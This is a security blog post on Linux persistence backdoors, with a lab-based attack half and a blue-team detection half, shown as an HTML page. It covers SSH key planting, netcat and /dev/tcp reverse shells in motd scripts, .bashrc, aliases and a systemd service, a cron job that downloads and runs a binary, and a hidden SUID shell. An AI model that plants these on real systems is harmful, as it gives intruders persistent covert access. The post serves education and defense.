<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>Linux Backdoors and Where to Find Them | Ef's log</title><meta name=keywords content="Computer Security,Linux Backdoor"><meta name=description content="Learn some backdoor techniques and how to deal with them!"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="Linux Backdoors and Where to Find Them"><meta property="og:description" content="Learn some backdoor techniques and how to deal with them!"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/"><meta property="og:image" content="https://fahmifj.github.io/imgs/image-20210606104746128.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2021-05-25T18:49:35+07:00"><meta property="article:modified_time" content="2021-11-03T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/imgs/image-20210606104746128.png"><meta name=twitter:title content="Linux Backdoors and Where to Find Them"><meta name=twitter:description content="Learn some backdoor techniques and how to deal with them!"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://fahmifj.github.io/blog/"},{"@type":"ListItem","position":2,"name":"Linux Backdoors and Where to Find Them","item":"https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Linux Backdoors and Where to Find Them","name":"Linux Backdoors and Where to Find Them","description":"Learn some backdoor techniques and how to deal with them!","keywords":["Computer Security","Linux Backdoor"],"articleBody":"In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.\nBackdoors, what is it? Well, I’m not going to go into as much detail as Wikipedia, but here’s:\nA backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.\nNow that we know what a backdoor is, let’s find out where the attackers typically hide them in a Linux system. For demonstration, I’ll be using the Pinky’s Palace machine from VulnHub, and let’s pretend it’s been compromised.\n1. SSH authorized_keys file SSH authorized_keys file contains a list of authorized users/public keys that are allowed to login into a specific account. In this file, the attackers can also place their public keys to authorize themselves and get instant access to the system via SSH.\nFor example, below are the exploitation steps to gain root access on the target system (Pinky’s Palace).\nOf course, as an attacker, I don’t want to repeat all these exploitation steps all over again.\nSo instead, on my attacking machine, I can generate a new pair of SSH keys for backdoor purpose.\nThe newly generated SSH public key (backdoor_ssh.pub) can be inserted into the root authorized_keys file of the compromised system as a backdoor.\nmkdir -p /root/.ssh/ \u0026\u0026 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali' \u003e /root/.ssh/authorized_keys Now by specifying backdoor_ssh as the identity file (private key), I’m able to gain access on the compromised system via SSH.\n2. SSH motd This is one of the cool tricks I’ve learned from HackTheBox machine called Traceback.\nMotd (Message of the day) is the banner that appears when you log in to a machine using SSH. For Ubuntu/Debian motd scripts can be found under /etc/update-motd.d/. By default, other users don’t have write permission on that directory.\nIn the image above, there is only one motd script called 10-uname.\nAs an attacker, I could place a new script there as a backdoor. For example, I will put a netcat reverse shell script called 20-backdoor under /etc/update-motd.d/.\nroot@pinkys-palace:/etc/update-motd.d# echo -e '#!/bin/sh\\nnc 192.168.2.103 9001 -e /bin/bash \u0026' \u003e 20-backdoor \u0026\u0026 chmod +x 20-backdoor Then I will setup a netcat listener and login into the compromised machine using a low privilege account named pinky.\nAs you can see, that SSH login triggered my reverse shell backdoor.\nBut wait, I logged in using pinky. How did I end up with a root shell?\nHere is the answer:\n…\n​ Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at ​ each login, and this information is concatenated in /var/run/motd. The order of script ​ execution is determined by the run-parts(8) –lsbsysinit option (basically alphabetical ​ order, with a few caveats).\n…\n3. User’s .bashrc - Interactive session .bashrc is one of the startup scripts used by Bourne shell aka bash. If there is a user who uses bash as their login shell, then this .bashrc will be executed for each interactive session they launch.\nHere are some actions that trigger interactive session:\nIn the image above, I inserted a non malicious line script echo \"I'm triggered\" to my .bashrc. But now, as an attacker, I can put a reverse shell there, and I will just wait for someone to log in to trigger it.\npinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash \u003e/dev/null \u0026' \u003e .bashrc 4. User’s .bashrc - Aliases As an attacker, I can also put the backdoor in the users’ aliases!\nHere is an example of a backdoored cd command.\nroot@pinkys-palace:~# alias cd='$(nc 192.168.2.103 9001 -e /bin/bash\u0026); cd' Here are some alias backdoors:\nhttps://github.com/nisay759/sudo-backdoor https://gist.github.com/ahhh/1d4bf832c5a88cc75adb 5. Cron jobs Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.\nHere is an example of a backdoor using Cron job.\nroot@pinkys-palace:~# echo '* * * * * root cd /tmp; wget 192.168.2.103/backdoor \u0026\u0026 chmod +x backdoor \u0026\u0026 ./backdoor' \u003e /etc/cron.d/backdoor What the task above does is it will download a malicious binary called ‘backdoor’ from my attacking machine, and the backdoor is then executed once every minute.\n6. Backdoor as a Service An attacker can also create a backdoor as a service (BaaS). Here is an example of BaaS in a single file (backdoor.service):\n[Service] Type=simple User=root ExecStart=/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/192.168.2.103/9001 0\u003e\u00261\" [Install] WantedBy=multi-user.target' When the service is started, it launches a reverse shell to the attacker.\nroot@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service It can be enabled on boot by issuing the following command:\nroot@pinkys-palace:/etc/systemd/system# systemctl enable backdoor.service 7. SUID The last one on this post is SUID. SUID allows other user to run an executable binary as the owner of the executable.\nAs an example, I can make a copy of bash binary (owned by root) called .backdoor (notice the dot) with SUID permission set to a low privilege user who has been compromised.\nWhy do I add dot?\nSome poeple tend to just use ls -l rather than ls -la, and this becomes an advantage for attackers to put a backdoor with a dot. It’s not just about SUID though, it applies to other backdoors as well (out of topic but cough and .git folder cough).\nBlue team side Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and combined with other techniques (not to mention there might be a rootkit too), making it difficult to detect/find.\nAlso what I share here might not be that effective, but here is how I usually deal with those backdoors in attack-defense CTF.\nSSH keys and .bashrc. Make sure to regularly check the all the users authorized_keys file.\nIn the image below, there is a public key with a foreign hostname kali instead of pinkys-palace, then we should suspect it.\nWell, actually, the attackers might have tricked it to look like it was a legitimate one.\nMy workaround here is why don’t we create a ‘skeleton’ file of all the authorized_keys files and set a Cronjob which automatically reverts these files back to its original state, and I might perform this remotely via scp. This can be applied as well to handle backdoor in .bashrc .\nYou can find the skeleton file of .bashrc at /etc/skel.\nSSH motd It’s not always placed under /etc/update-motd.d/, but make sure the motd directory is only writable by root, note the default list of motd files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.\nWe could also do some ‘forensics’ using timestamp:\nroot@MSI:/etc/update-motd.d# ls --full-time For example, these files with the timestamp 000000000 (nano) in the image below have most likely not been modified and are still in their original state.\nAfter inserting a non-malicious line, the timestamp changed. From here, it’s safe to assume that someone/something has modified it.\nCronjobs and Services We can monitor the process using netstat and ps command. Anything that looks like a program with unknown IP and a port supplied as its args (a reverse shell or a bind shell) is definitely suspicious.\nFor this, we can look for any unwanted open ports using this command:\n$ netstat -antp | grep LISTEN To find a suspicious connection we can use this command:\n$ netstat -antp | grep ESTABLISHED Sometimes the state of a reverse shell backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. This occurs when the backdoor fail to reach out the attacker. To find this we can use the following command:\n$ netstat -antp | grep SYN_SENT We could also check each user’s crontab using the following commands:\n$ for user in $(cat /etc/passwd | cut -f1 -d: ); do echo $user; crontab -u $user -l; done # Only users who have login shell $ for user in $(cat /etc/passwd | grep sh$ | cut -f1 -d: ); do echo $user; crontab -u $user -l; done There is also the ps -f command which is pretty good at visualizing the process tree. For example, here we know that the culprit that keeps opening the HTTPS port (443) is probably on .bashrc file because it gets triggered every time we launch a bash shell (interactive session).\nIf you prefer the detailed view, consider to use ps auxfww to show process tree with username, TTY, and a wide output.\nFinding SUID To find some suspicious SUID we can use the find commands. It can also detect the SUID that started with dot!\nroot@pinkys-palace:/etc/update-motd.d# find / -type f -perm 4755 2\u003e/dev/null\n[Update]\nSorry for my stupidity, I forget to update this section.\nUsing -perm 4755, you will not find a file with permissions set to 4755, 4765, 4701, etc.\nWe can change it to -perm -u=s, so it will always search for the SUID permission (the s/4 part).\n$ find / -type f -perm -u=s 2\u003e/dev/null Okay, that’s all in this post, I hope you like it.\n","wordCount":"1544","inLanguage":"en","image":"https://fahmifj.github.io/imgs/image-20210606104746128.png","datePublished":"2021-05-25T18:49:35+07:00","dateModified":"2021-11-03T00:00:00Z","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/blog/>Blog</a></div><h1 class=post-title>Linux Backdoors and Where to Find Them</h1><p class=post-description>Learn some backdoor techniques and how to deal with them!</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>May 25, 2021
<span class=date-update>(Edited: November 03, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>8 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#backdoors-what-is-it aria-label="Backdoors, what is it?">Backdoors, what is it?</a><ul><li><a href=#1-ssh-authorized_keys-file aria-label="1. SSH authorized_keys file">1. SSH authorized_keys file</a></li><li><a href=#2-ssh-motd aria-label="2. SSH motd">2. SSH motd</a></li><li><a href=#3-users-bashrc---interactive-session aria-label="3. User&amp;rsquo;s .bashrc - Interactive session">3. User&rsquo;s .bashrc - Interactive session</a></li><li><a href=#4-users-bashrc---aliases aria-label="4. User&amp;rsquo;s .bashrc - Aliases">4. User&rsquo;s .bashrc - Aliases</a></li><li><a href=#5-cron-jobs aria-label="5. Cron jobs">5. Cron jobs</a></li><li><a href=#6-backdoor-as-a-service aria-label="6. Backdoor as a Service">6. Backdoor as a Service</a></li><li><a href=#7-suid aria-label="7. SUID">7. SUID</a></li></ul></li><li><a href=#blue-team-side aria-label="Blue team side">Blue team side</a><ul><li><a href=#ssh-keys-and-bashrc aria-label="SSH keys and .bashrc.">SSH keys and .bashrc.</a></li><li><a href=#ssh-motd aria-label="SSH motd">SSH motd</a></li><li><a href=#cronjobs-and-services aria-label="Cronjobs and Services">Cronjobs and Services</a></li><li><a href=#finding-suid aria-label="Finding SUID">Finding SUID</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128_hu44ac286f7378d793df54dbea9be9e208_1361120_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128_hu44ac286f7378d793df54dbea9be9e208_1361120_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128_hu44ac286f7378d793df54dbea9be9e208_1361120_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128_hu44ac286f7378d793df54dbea9be9e208_1361120_1080x0_resize_box_3.png 1080w ,https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128_hu44ac286f7378d793df54dbea9be9e208_1361120_1500x0_resize_box_3.png 1500w ,https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128.png 1920w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/imgs/image-20210606104746128.png alt="Linux Backdoors" width=1920 height=1280><p>Photo by Dima Pechurin on Unsplash</p></figure><p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p><h2 id=backdoors-what-is-it>Backdoors, what is it?<a class=anchor aria-hidden=true href=#backdoors-what-is-it>#</a></h2><p>Well, I&rsquo;m not going to go into as much detail as <a href=https://en.wikipedia.org/wiki/Backdoor_(computing)>Wikipedia</a>, but here&rsquo;s:</p><p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p><p>Now that we know what a backdoor is, let&rsquo;s find out where the attackers typically hide them in a <strong>Linux</strong> system. For demonstration, I’ll be using the <a href=https://www.vulnhub.com/entry/pinkys-palace-v1,225/>Pinky’s Palace</a> machine from VulnHub, and let’s pretend it&rsquo;s been compromised.</p><h3 id=1-ssh-authorized_keys-file>1. SSH authorized_keys file<a class=anchor aria-hidden=true href=#1-ssh-authorized_keys-file>#</a></h3><p>SSH <a href=https://www.ssh.com/academy/ssh/authorized_keys/openssh>authorized_keys</a> file contains a list of authorized users/public keys that are allowed to login into a specific account. In this file, the attackers can also place their public keys to authorize themselves and get instant access to the system via SSH.</p><p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p><p><div class=img-container><img src=imgs/image-20210526004056632.png alt=image-20210526004056632></div></p><p>Of course, as an attacker, I don’t want to repeat all these exploitation steps all over again.</p><p>So instead, on my attacking machine, I can generate a new pair of <a href=https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54>SSH keys</a> for backdoor purpose.</p><p><div class=img-container><img src=imgs/image-20210526004747293.png alt=image-20210526004747293></div></p><p>The newly generated SSH public key (<code>backdoor_ssh.pub</code>) can be inserted into the root <code>authorized_keys</code> file of the compromised system as a backdoor.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>mkdir -p /root/.ssh/ <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s1>&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39;</span> &gt; /root/.ssh/authorized_keys
</span></span></code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), I’m able to gain access on the compromised system via SSH.</p><p><div class=img-container><img src=imgs/image-20210526005156382.png alt=image-20210526005156382></div></p><h3 id=2-ssh-motd>2. SSH motd<a class=anchor aria-hidden=true href=#2-ssh-motd>#</a></h3><p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called <a href=https://www.hackthebox.eu/home/machines/profile/233>Traceback.</a></p><p><strong>Motd</strong> (Message of the day) is the banner that appears when you log in to a machine using SSH. For Ubuntu/Debian <strong>motd</strong> scripts can be found under <code>/etc/update-motd.d/</code>. By default, other users don&rsquo;t have write permission on that directory.</p><p><div class=img-container><img src=imgs/image-20210526010220513.png alt=image-20210526010220513></div></p><p>In the image above, there is only one <strong>motd</strong> script called <code>10-uname</code>.</p><p>As an attacker, I could place a new script there as a backdoor. For example, I will put a netcat <a href=https://www.techslang.com/definition/what-is-a-reverse-shell/>reverse shell</a> script called <code>20-backdoor</code> under <code>/etc/update-motd.d/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@pinkys-palace:/etc/update-motd.d# <span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class=o>&amp;&amp;</span> chmod +x 20-backdoor
</span></span></code></pre></div><p>Then I will setup a netcat listener and login into the compromised machine using a low privilege account named <code>pinky</code>.</p><p><div class=img-container><img src=imgs/image-20210526010934360.png alt=image-20210526010934360></div></p><p>As you can see, that SSH login triggered my reverse shell backdoor.</p><p>But wait, I logged in using pinky. How did I end up with a root shell?</p><p>Here is the <a href=http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm>answer</a>:</p><blockquote><p>&mldr;</p><p>​ Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
​ each login, and this information is concatenated in /var/run/motd. The order of script
​ execution is determined by the run-parts(8) &ndash;lsbsysinit option (basically alphabetical
​ order, with a few caveats).</p><p>&mldr;</p></blockquote><h3 id=3-users-bashrc---interactive-session>3. User&rsquo;s .bashrc - Interactive session<a class=anchor aria-hidden=true href=#3-users-bashrc---interactive-session>#</a></h3><p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then this <code>.bashrc</code> will be executed for each interactive session they launch.</p><p>Here are some actions that trigger interactive session:</p><p><div class=img-container><img src=imgs/image-20210526005325944.png alt=image-20210526005325944></div></p><p>In the image above, I inserted a non malicious line script <code>echo "I'm triggered"</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a reverse shell there, and I will just wait for someone to log in to trigger it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>pinky@pinkys-palace:~$ <span class=nb>echo</span> <span class=s1>&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210525220025256.png alt=image-20210525220025256></div></p><h3 id=4-users-bashrc---aliases>4. User&rsquo;s .bashrc - Aliases<a class=anchor aria-hidden=true href=#4-users-bashrc---aliases>#</a></h3><p>As an attacker, I can also put the backdoor in the users&rsquo; aliases!</p><p>Here is an example of a <em>backdoored</em> <code>cd</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@pinkys-palace:~# <span class=nb>alias</span> <span class=nv>cd</span><span class=o>=</span><span class=s1>&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210526002305189.png alt=image-20210526002305189></div></p><p>Here are some alias backdoors:</p><ul><li><a href=https://github.com/nisay759/sudo-backdoor>https://github.com/nisay759/sudo-backdoor</a></li><li><a href=https://gist.github.com/ahhh/1d4bf832c5a88cc75adb>https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li></ul><h3 id=5-cron-jobs>5. Cron jobs<a class=anchor aria-hidden=true href=#5-cron-jobs>#</a></h3><p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p><p>Here is an example of a backdoor using Cron job.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@pinkys-palace:~# <span class=nb>echo</span> <span class=s1>&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor
</span></span></code></pre></div><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; from my attacking machine, and the backdoor is then executed once every minute.</p><p><div class=img-container><img src=imgs/image-20210625141344607.png alt=image-20210625141344607></div></p><h3 id=6-backdoor-as-a-service>6. Backdoor as a Service<a class=anchor aria-hidden=true href=#6-backdoor-as-a-service>#</a></h3><p>An attacker can also create a backdoor as a service (BaaS). Here is an example of BaaS in a single file (<code>backdoor.service</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[Service]
</span></span><span class=line><span class=cl>Type=simple
</span></span><span class=line><span class=cl>User=root
</span></span><span class=line><span class=cl>ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
</span></span><span class=line><span class=cl>[Install]
</span></span><span class=line><span class=cl>WantedBy=multi-user.target&#39;
</span></span></code></pre></div><p>When the service is started, it launches a reverse shell to the attacker.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210526013637397.png alt=image-20210526013637397></div></p><p>It can be enabled on boot by issuing the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@pinkys-palace:/etc/systemd/system# systemctl <span class=nb>enable</span> backdoor.service
</span></span></code></pre></div><h3 id=7-suid>7. SUID<a class=anchor aria-hidden=true href=#7-suid>#</a></h3><p>The last one on this post is <a href=https://en.wikipedia.org/wiki/Setuid>SUID</a>. SUID allows other user to run an executable binary as the owner of the executable.</p><p>As an example, I can make a copy of bash binary (owned by root) called <code>.backdoor</code> (notice the dot) with SUID permission set to a low privilege user who has been compromised.</p><p><div class=img-container><img src=imgs/image-20210526020936681.png alt=image-20210526020936681></div></p><p>Why do I add dot?</p><p>Some poeple tend to just use <code>ls -l</code> rather than <code>ls -la</code>, and this becomes an advantage for attackers to put a backdoor with a dot. It’s not just about SUID though, it applies to other backdoors as well (out of topic but <strong>cough</strong> and <code>.git</code> folder <strong>cough</strong>).</p><h2 id=blue-team-side>Blue team side<a class=anchor aria-hidden=true href=#blue-team-side>#</a></h2><p>Before reading further, I’ll state that if your server (irl) gets hacked, it’s better to restore the server’s backup or completely rebuild it from scratch, because in the real world, those backdoors can be obfuscated and <strong>combined</strong> with other techniques (not to mention there might be a rootkit too), making it difficult to detect/find.</p><p>Also what I share here might not be that effective, but here is how I usually deal with those backdoors in attack-defense CTF.</p><h3 id=ssh-keys-and-bashrc>SSH keys and .bashrc.<a class=anchor aria-hidden=true href=#ssh-keys-and-bashrc>#</a></h3><p>Make sure to regularly check the all the users <code>authorized_keys</code> file.</p><p>In the image below, there is a public key with a foreign hostname <code>kali</code> instead of <code>pinkys-palace</code>, then we should suspect it.</p><p><div class=img-container><img src=imgs/image-20210605091730851.png alt=image-20210605091730851></div></p><p>Well, actually, the attackers might have tricked it to look like it was a legitimate one.</p><p>My workaround here is why don’t we create a ‘skeleton’ file of all the <code>authorized_keys</code> files and set a Cronjob which automatically reverts these files back to its original state, and I might perform this remotely via <code>scp</code>. This can be applied as well to handle backdoor in <code>.bashrc</code> .</p><blockquote><p>You can find the skeleton file of <code>.bashrc</code> at <code>/etc/skel</code>.</p></blockquote><h3 id=ssh-motd>SSH motd<a class=anchor aria-hidden=true href=#ssh-motd>#</a></h3><p>It&rsquo;s not always placed under <code>/etc/update-motd.d/</code>, but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.</p><p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@MSI:/etc/update-motd.d# ls --full-time
</span></span></code></pre></div><p>For example, these files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state.</p><p><div class=img-container><img src=imgs/image-20210605092751344.png alt=image-20210605092751344></div></p><p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p><p><div class=img-container><img src=imgs/image-20210605093121574.png alt=image-20210605093121574></div></p><h3 id=cronjobs-and-services>Cronjobs and Services<a class=anchor aria-hidden=true href=#cronjobs-and-services>#</a></h3><p>We can monitor the process using <code>netstat</code> and <code>ps</code> command. Anything that looks like a program with unknown IP and a port supplied as its args (a reverse shell or a bind shell) is definitely suspicious.</p><p>For this, we can look for any unwanted open ports using this command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ netstat -antp <span class=p>|</span> grep LISTEN
</span></span></code></pre></div><p>To find a suspicious connection we can use this command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ netstat -antp <span class=p>|</span> grep ESTABLISHED
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210526034616621.png alt=image-20210526034616621></div></p><p>Sometimes the state of a reverse shell backdoor is neither ESTABLISHED nor LISTEN but SYN_SENT. This occurs when the backdoor fail to reach out the attacker. To find this we can use the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ netstat -antp <span class=p>|</span> grep SYN_SENT
</span></span></code></pre></div><p>We could also check each user’s crontab using the following commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=k>for</span> user in <span class=k>$(</span>cat /etc/passwd <span class=p>|</span> cut -f1 -d: <span class=k>)</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> <span class=nv>$user</span><span class=p>;</span> crontab -u <span class=nv>$user</span> -l<span class=p>;</span> <span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Only users who have login shell</span>
